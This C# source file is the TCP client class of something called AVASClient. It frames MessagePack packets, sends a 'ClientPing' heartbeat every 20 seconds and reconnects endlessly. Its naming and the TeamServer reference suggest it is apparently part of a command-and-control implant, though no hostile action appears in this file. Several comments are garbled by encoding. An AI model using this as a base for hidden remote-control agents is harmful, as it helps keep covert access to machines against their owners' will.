using AVASClient.Handle_Packet;
using AVASClient.MessagePackLib;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using TeamServer.Data;

namespace AVASClient
{
    public class Client
    {
        private TcpClient _tcp;
        private NetworkStream _stream;
        private byte[] _recvBuffer = new byte[8192];
        private byte[] _accumulator = new byte[0];
        private readonly object _sendLock = new object();
        private string _host;
        private int _port;
        private volatile bool _running;
        private System.Timers.Timer _heartbeatTimer;                      // ������ʱ��

        /// <summary>
        /// 是否已连接
        /// </summary>
        public bool IsConnected => _running && _tcp?.Connected == true;

        public bool Connect(string host, int port)
        {
            try
            {
                _host = host; _port = port;
                _tcp = new TcpClient();
                _tcp.NoDelay = true;
                try { _tcp.Client.SetSocketOption(System.Net.Sockets.SocketOptionLevel.Socket, System.Net.Sockets.SocketOptionName.KeepAlive, true); } catch { }
                _tcp.Connect(host, port);
                _stream = _tcp.GetStream();
                _running = true;
                var t = new Thread(ReceiveLoop) { IsBackground = true };
                t.Start();
                ClientMsgPack.Init();

                // ����������ÿ20�뷢��һ�� ClientPing
                _heartbeatTimer = new System.Timers.Timer(20000);
                _heartbeatTimer.AutoReset = true;
                _heartbeatTimer.Elapsed += (_, __) =>
                {
                    try
                    {
                        var mp = new ClientMsgPack();
                        mp.ForcePathObject("Pac_ket").SetAsString("ClientPing");
                        SendFramed(mp.Encode2Bytes());
                    }
                    catch
                    {
                        // ����ʧ����Ϊ�����쳣����������
                        try { _heartbeatTimer?.Stop(); } catch { }
                        try { _tcp?.Close(); } catch { }
                    }
                };
                _heartbeatTimer.Start();
                return true;
            }
            catch
            {
                return false;
            }
        }


        /// <summary>
        /// ????????
        /// </summary>
        /// <param name="payload"></param>
        public void SendFramed(byte[] payload)
        {
            if (_stream == null) return;
            var length = payload.Length;
            var header = new byte[4];
            header[0] = (byte)((length >> 24) & 0xFF);
            header[1] = (byte)((length >> 16) & 0xFF);
            header[2] = (byte)((length >> 8) & 0xFF);
            header[3] = (byte)(length & 0xFF);

            lock (_sendLock)
            {
                try
                {
                    _stream.Write(header, 0, 4);
                    _stream.Write(payload, 0, payload.Length);
                }
                catch { }
            }
        }


        private void ReceiveLoop()
        {
            try
            {
                while (true)
                {
                    int read = _stream.Read(_recvBuffer, 0, _recvBuffer.Length);
                    if (read <= 0) break;
                    AppendToAccumulator(_recvBuffer, read);
                    ProcessAccumulator();
                }
            }
            catch
            {
            }
            finally
            {
                _running = false;
                try { _heartbeatTimer?.Stop(); } catch { }
                try { _heartbeatTimer?.Dispose(); } catch { }
                TryReconnect();
            }
        }

        private void AppendToAccumulator(byte[] data, int count)
        {
            var combined = new byte[_accumulator.Length + count];
            Buffer.BlockCopy(_accumulator, 0, combined, 0, _accumulator.Length);
            Buffer.BlockCopy(data, 0, combined, _accumulator.Length, count);
            _accumulator = combined;
        }

        private void ProcessAccumulator()//???????
        {
            int offset = 0;
            while (true)
            {
                if (_accumulator.Length - offset < 4) break;

                int payloadLength =
                    (_accumulator[offset] << 24) |
                    (_accumulator[offset + 1] << 16) |
                    (_accumulator[offset + 2] << 8) |
                    _accumulator[offset + 3];

                if (payloadLength <= 0 || payloadLength > 16 * 1024 * 1024)
                {
                    // �Ƿ����ȣ�������ǰ���壬���Դ��󣬲�����������ͬ��
                    _accumulator = Array.Empty<byte>();
                    return;
                }

                if (_accumulator.Length - offset - 4 < payloadLength)
                {
                    // ���ݲ��㣺�ȴ���������
                    break;
                }

                var payload = new byte[payloadLength];
                Buffer.BlockCopy(_accumulator, offset + 4, payload, 0, payloadLength);
                try
                {
                    Packet.ReadAsync(payload);
                }
                catch { }

                offset += 4 + payloadLength;
            }

            if (offset > 0)
            {
                var remaining = _accumulator.Length - offset;
                var tail = new byte[remaining];
                if (remaining > 0)
                {
                    Buffer.BlockCopy(_accumulator, offset, tail, 0, remaining);
                }
                _accumulator = tail;
            }
        }
        private void TryReconnect()
        {
            // �򵥵��������ƣ�ָ���˱�����
            int attempt = 0;
            while (true) // 保持无限制重连
            {
                try
                {
                    attempt++;
                    var delayMs = Math.Min(60000, (int)Math.Pow(2, Math.Min(10, attempt)) * 1000); // 增加延迟时间
                    System.Threading.Thread.Sleep(delayMs);
                    if (Connect(_host, _port))
                    {
                        Console.WriteLine($"[AVASClient] 重连成功");
                        return;
                    }
                }
                catch { }
            }
            Console.WriteLine($"[AVASClient] 重连失败，已达到最大重连次数");
        }
    }
}


